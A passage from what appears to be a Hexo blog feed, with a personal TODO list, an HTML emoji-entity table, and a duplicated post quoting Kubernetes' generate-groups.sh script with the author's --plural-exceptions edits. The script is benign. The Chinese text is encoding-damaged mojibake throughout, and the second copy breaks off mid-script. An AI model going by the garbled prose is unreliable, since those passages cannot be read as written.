¸è§‚æµ‹æŠ€æœ¯</li></ul><p>ã€è¯¾ç¨‹ç±»ã€‘</p><ul><li><input disabled="" type="checkbox"> æå®¢æ—¶é—´ ebpfè¯¾ç¨‹  </li><li><input disabled="" type="checkbox"> æå®¢æ—¶é—´ linuxæºç è¯¾ç¨‹  </li><li><input disabled="" type="checkbox"> bç«™ å†…æ ¸è·Ÿè¸ª</li></ul><p>ã€å·¥å…·ç±»ã€‘</p><ul><li><input disabled="" type="checkbox"> beyondcompare è¿‡æœŸ</li><li><input disabled="" type="checkbox"> secureCRT è€æ˜¯é€€å‡º</li></ul><p>ã€å®è·µç±»ã€‘</p><ul><li><input disabled="" type="checkbox"> n2 ebpfå®è·µ</li></ul><p>ã€è¯ä¹¦ç±»ã€‘</p><ul><li><input checked="" disabled="" type="checkbox"> cka</li><li><input disabled="" type="checkbox"> cks</li><li><input disabled="" type="checkbox"> è½¯è€ƒ-ç½‘å·¥</li></ul><h2 id="è¡¨æƒ…åŒ…"><a href="#è¡¨æƒ…åŒ…" class="headerlink" title="è¡¨æƒ…åŒ…"></a>è¡¨æƒ…åŒ…</h2><p>è¯­æ³•:Â <code>&amp;#xCODE;</code></p><p>CODE å¯ä»¥å‚è€ƒ<a href="https://apps.timwhitlock.info/emoji/tables/unicode#block-6c-other-additional-symbols">Emoji Unicode Tables</a></p><p>ä¾‹:</p><ul><li><code>U+1F60D -&gt; &amp;#x1F60D;</code>Â &#x3D; ğŸ˜</li><li><code>U+2705 -&gt; &amp;#x2705;</code>Â &#x3D; âœ…</li><li><code>U+2764 -&gt; &amp;#x2764;</code>Â &#x3D; â¤</li><li><code>U+24C2 -&gt; &amp;#x24C2;</code>Â &#x3D; â“‚</li><li><code>U+1F1E8 U+1F1F3 -&gt; &amp;#x1F1E8; &amp;#x1F1F3; / &amp;#x1F1E8;&amp;#x1F1F3;</code>Â &#x3D; ğŸ‡¨ ğŸ‡³ &#x2F; ğŸ‡¨ğŸ‡³</li><li><code>U+231B -&gt; &amp;#x231B;</code>Â &#x3D; âŒ›</li><li><code>U+1F30F -&gt; &amp;#x1F30F;</code>Â &#x3D; ğŸŒ</li><li><code>U+1F34E -&gt; &amp;#x1F34E;</code>Â &#x3D; ğŸ</li><li><code>U+1F34F -&gt; &amp;#x1F34F;</code>Â &#x3D; ğŸ</li><li><code>U+1F422 -&gt; &amp;#x1F422;</code>Â &#x3D; ğŸ¢</li><li><code>U+1F634 -&gt; &amp;#x1F634;</code>Â &#x3D; ğŸ˜´</li></ul>]]></content>
    
    
    <categories>
      
      <category>TODO</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘code-generator</title>
    <link href="/2023/03/02/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91code-generator/"/>
    <url>/2023/03/02/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91code-generator/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230303100520.png" alt="image.png"></p><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><ol><li>code-generatoræ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„ï¼Ÿæœ‰ä»€ä¹ˆåŠŸèƒ½ï¼Ÿ</li><li></li></ol><h2 id="å¾…è§£å†³"><a href="#å¾…è§£å†³" class="headerlink" title="å¾…è§£å†³"></a>å¾…è§£å†³</h2><p>..&#x2F;vendor&#x2F;k8s.io&#x2F;code-generator&#x2F;generate-groups.sh</p><p>code-generatoré¡¹ç›®ä¸‹çš„generate-groups.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env bash</span><br><br><span class="hljs-comment"># Copyright 2017 The Kubernetes Authors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="hljs-comment"># you may not use this file except in compliance with the License.</span><br><span class="hljs-comment"># You may obtain a copy of the License at</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#     http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Unless required by applicable law or agreed to in writing, software</span><br><span class="hljs-comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="hljs-comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="hljs-comment"># See the License for the specific language governing permissions and</span><br><span class="hljs-comment"># limitations under the License.</span><br><br><span class="hljs-built_in">set</span> -o errexit<br><span class="hljs-built_in">set</span> -o nounset<br><span class="hljs-built_in">set</span> -o pipefail<br><br><span class="hljs-comment"># generate-groups generates everything for a project with external types only, e.g. a project based</span><br><span class="hljs-comment"># on CustomResourceDefinitions.</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -lt 4 ] || [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span> == <span class="hljs-string">&quot;--help&quot;</span> ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">Usage: $(basename &quot;$0&quot;) &lt;generators&gt; &lt;output-package&gt; &lt;apis-package&gt; &lt;groups-versions&gt; ...</span><br><span class="hljs-string"></span><br><span class="hljs-string">  &lt;generators&gt;        the generators comma separated to run (deepcopy,defaulter,client,lister,informer) or &quot;all&quot;.</span><br><span class="hljs-string">  &lt;output-package&gt;    the output package name (e.g. github.com/example/project/pkg/generated).</span><br><span class="hljs-string">  &lt;apis-package&gt;      the external types dir (e.g. github.com/example/api or github.com/example/project/pkg/apis).</span><br><span class="hljs-string">  &lt;groups-versions&gt;   the groups and their versions in the format &quot;groupA:v1,v2 groupB:v1 groupC:v2&quot;, relative</span><br><span class="hljs-string">                      to &lt;api-package&gt;.</span><br><span class="hljs-string">  ...                 arbitrary flags passed to all generator binaries.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Examples:</span><br><span class="hljs-string">  $(basename &quot;$0&quot;) all             github.com/example/project/pkg/client github.com/example/project/pkg/apis &quot;foo:v1 bar:v1alpha1,v1beta1&quot;</span><br><span class="hljs-string">  $(basename &quot;$0&quot;) deepcopy,client github.com/example/project/pkg/client github.com/example/project/pkg/apis &quot;foo:v1 bar:v1alpha1,v1beta1&quot;</span><br><span class="hljs-string">EOF</span><br>  <span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><br>GENS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>OUTPUT_PKG=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br>APIS_PKG=<span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span><br>GROUPS_WITH_VERSIONS=<span class="hljs-string">&quot;<span class="hljs-variable">$4</span>&quot;</span><br><span class="hljs-built_in">shift</span> 4<br><br>(<br>  <span class="hljs-comment"># To support running this script from anywhere, first cd into this directory,</span><br>  <span class="hljs-comment"># and then install with forced module mode on and fully qualified name.</span><br>  <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(dirname <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;0&#125;</span>&quot;</span>)</span>&quot;</span><br>  GO111MODULE=on go install k8s.io/code-generator/cmd/&#123;defaulter-gen,client-gen,lister-gen,informer-gen,deepcopy-gen&#125;<br>)<br><span class="hljs-comment"># Go installs the above commands to get installed in $GOBIN if defined, and $GOPATH/bin otherwise:</span><br>GOBIN=<span class="hljs-string">&quot;<span class="hljs-subst">$(go env GOBIN)</span>&quot;</span><br>gobin=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GOBIN:-$(go env GOPATH)/bin&#125;</span>&quot;</span><br><br><span class="hljs-keyword">function</span> codegen::<span class="hljs-function"><span class="hljs-title">join</span></span>() &#123; <span class="hljs-built_in">local</span> IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>; <span class="hljs-built_in">shift</span>; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;$*&quot;</span>; &#125;<br><br><span class="hljs-comment"># enumerate group versions</span><br>FQ_APIS=() <span class="hljs-comment"># e.g. k8s.io/api/apps/v1</span><br><span class="hljs-keyword">for</span> GVs <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span>; <span class="hljs-keyword">do</span><br>  IFS=: <span class="hljs-built_in">read</span> -r G Vs &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GVs&#125;</span>&quot;</span><br><br>  <span class="hljs-comment"># enumerate versions</span><br>  <span class="hljs-keyword">for</span> V <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;Vs//,/ &#125;</span>; <span class="hljs-keyword">do</span><br>    FQ_APIS+=(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;APIS_PKG&#125;</span>/<span class="hljs-variable">$&#123;G&#125;</span>/<span class="hljs-variable">$&#123;V&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;deepcopy&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating deepcopy funcs&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/deepcopy-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      -O zz_generated.deepcopy \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;client&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating clientset for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/client-gen&quot;</span> \<br>      --clientset-name <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CLIENTSET_NAME_VERSIONED:-versioned&#125;</span>&quot;</span> \<br>      --input-base <span class="hljs-string">&quot;&quot;</span> \<br>      --input <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;lister&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating listers for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/lister-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;informer&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating informers for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/informers&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/informer-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --versioned-clientset-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_NAME_VERSIONED:-versioned&#125;</span>&quot;</span> \<br>      --listers-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/informers&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br>      <span class="hljs-comment"># --plural-exceptions [&quot;Endpoint:Endpointes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions [Endpointes:Endpointes] \</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfoes:ProductInstanceVpcInfoes] \</span><br>      <span class="hljs-comment"># --plural-exceptions ProductInstanceVpcInfoes:ProductInstanceVpcInfoes \</span><br>      <span class="hljs-comment"># --plural-exceptions ProductInstanceVpcInfoes \    # ä¼šæŠ¥é”™</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfoes] \  # ä¼šæŠ¥é”™</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfo,ProductInstanceVpcInfoes] \  # ä¼šæŠ¥é”™</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfo,ProductInstanceVpcInfoes&quot;] \  # ä¼šæŠ¥é”™</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;Endpoints:Endpointes&quot;, &quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions &quot;Endpoints:Endpointes&quot;, &quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot; \</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;, &quot;Endpoints:Endpointes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;],[&quot;Endpoints:Endpointes&quot;] \</span><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://github.com/kubernetes/code-generator">code-generator github</a><br><a href="https://juejin.cn/post/7096484178128011277"># code-generatorç®€å•ä»‹ç»</a><br>[# [k8sè‡ªå®šä¹‰controllerè®¾è®¡ä¸å®ç°] (æœ‰controllerçš„ä¸šåŠ¡å¤„ç†ç¤ºä¾‹ï¼Œè¿˜æœ‰æ³¨é‡Š)<br><a href="https://www.51cto.com/article/692169.html">Kubernetesä¸­è‡ªå®šä¹‰Controller</a> (æœ‰controllerçš„ä¸šåŠ¡å¤„ç†ç¤ºä¾‹ï¼Œè¿˜æœ‰æ³¨é‡Š)</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘code-generator</title>
    <link href="/2023/03/02/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91code-generator/"/>
    <url>/2023/03/02/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91code-generator/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230303100520.png" alt="image.png"></p><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><ol><li>code-generatoræ˜¯ç”¨æ¥å¹²ä»€ä¹ˆçš„ï¼Ÿæœ‰ä»€ä¹ˆåŠŸèƒ½ï¼Ÿ</li><li></li></ol><h2 id="å¾…è§£å†³"><a href="#å¾…è§£å†³" class="headerlink" title="å¾…è§£å†³"></a>å¾…è§£å†³</h2><p>..&#x2F;vendor&#x2F;k8s.io&#x2F;code-generator&#x2F;generate-groups.sh</p><p>code-generatoré¡¹ç›®ä¸‹çš„generate-groups.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env bash</span><br><br><span class="hljs-comment"># Copyright 2017 The Kubernetes Authors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="hljs-comment"># you may not use this file except in compliance with the License.</span><br><span class="hljs-comment"># You may obtain a copy of the License at</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#     http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Unless required by applicable law or agreed to in writing, software</span><br><span class="hljs-comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="hljs-comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="hljs-comment"># See the License for the specific language governing permissions and</span><br><span class="hljs-comment"># limitations under the License.</span><br><br><span class="hljs-built_in">set</span> -o errexit<br><span class="hljs-built_in">set</span> -o nounset<br><span class="hljs-built_in">set</span> -o pipefail<br><br><span class="hljs-comment"># generate-groups generates everything for a project with external types only, e.g. a project based</span><br><span class="hljs-comment"># on CustomResourceDefinitions.</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -lt 4 ] || [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span> == <span class="hljs-string">&quot;--help&quot;</span> ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">Usage: $(basename &quot;$0&quot;) &lt;generators&gt; &lt;output-package&gt; &lt;apis-package&gt; &lt;groups-versions&gt; ...</span><br><span class="hljs-string"></span><br><span class="hljs-string">  &lt;generators&gt;        the generators comma separated to run (deepcopy,defaulter,client,lister,informer) or &quot;all&quot;.</span><br><span class="hljs-string">  &lt;output-package&gt;    the output package name (e.g. github.com/example/project/pkg/generated).</span><br><span class="hljs-string">  &lt;apis-package&gt;      the external types dir (e.g. github.com/example/api or github.com/example/project/pkg/apis).</span><br><span class="hljs-string">  &lt;groups-versions&gt;   the groups and their versions in the format &quot;groupA:v1,v2 groupB:v1 groupC:v2&quot;, relative</span><br><span class="hljs-string">                      to &lt;api-package&gt;.</span><br><span class="hljs-string">  ...                 arbitrary flags passed to all generator binaries.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Examples:</span><br><span class="hljs-string">  $(basename &quot;$0&quot;) all             github.com/example/project/pkg/client github.com/example/project/pkg/apis &quot;foo:v1 bar:v1alpha1,v1beta1&quot;</span><br><span class="hljs-string">  $(basename &quot;$0&quot;) deepcopy,client github.com/example/project/pkg/client github.com/example/project/pkg/apis &quot;foo:v1 bar:v1alpha1,v1beta1&quot;</span><br><span class="hljs-string">EOF</span><br>  <span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><br>GENS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>OUTPUT_PKG=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br>APIS_PKG=<span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span><br>GROUPS_WITH_VERSIONS=<span class="hljs-string">&quot;<span class="hljs-variable">$4</span>&quot;</span><br><span class="hljs-built_in">shift</span> 4<br><br>(<br>  <span class="hljs-comment"># To support running this script from anywhere, first cd into this directory,</span><br>  <span class="hljs-comment"># and then install with forced module mode on and fully qualified name.</span><br>  <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(dirname <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;0&#125;</span>&quot;</span>)</span>&quot;</span><br>  GO111MODULE=on go install k8s.io/code-generator/cmd/&#123;defaulter-gen,client-gen,lister-gen,informer-gen,deepcopy-gen&#125;<br>)<br><span class="hljs-comment"># Go installs the above commands to get installed in $GOBIN if defined, and $GOPATH/bin otherwise:</span><br>GOBIN=<span class="hljs-string">&quot;<span class="hljs-subst">$(go env GOBIN)</span>&quot;</span><br>gobin=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GOBIN:-$(go env GOPATH)/bin&#125;</span>&quot;</span><br><br><span class="hljs-keyword">function</span> codegen::<span class="hljs-function"><span class="hljs-title">join</span></span>() &#123; <span class="hljs-built_in">local</span> IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>; <span class="hljs-built_in">shift</span>; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;$*&quot;</span>; &#125;<br><br><span class="hljs-comment"># enumerate group versions</span><br>FQ_APIS=() <span class="hljs-comment"># e.g. k8s.io/api/apps/v1</span><br><span class="hljs-keyword">for</span> GVs <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span>; <span class="hljs-keyword">do</span><br>  IFS=: <span class="hljs-built_in">read</span> -r G Vs &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GVs&#125;</span>&quot;</span><br><br>  <span class="hljs-comment"># enumerate versions</span><br>  <span class="hljs-keyword">for</span> V <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;Vs//,/ &#125;</span>; <span class="hljs-keyword">do</span><br>    FQ_APIS+=(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;APIS_PKG&#125;</span>/<span class="hljs-variable">$&#123;G&#125;</span>/<span class="hljs-variable">$&#123;V&#125;</span>&quot;</span>)<br>  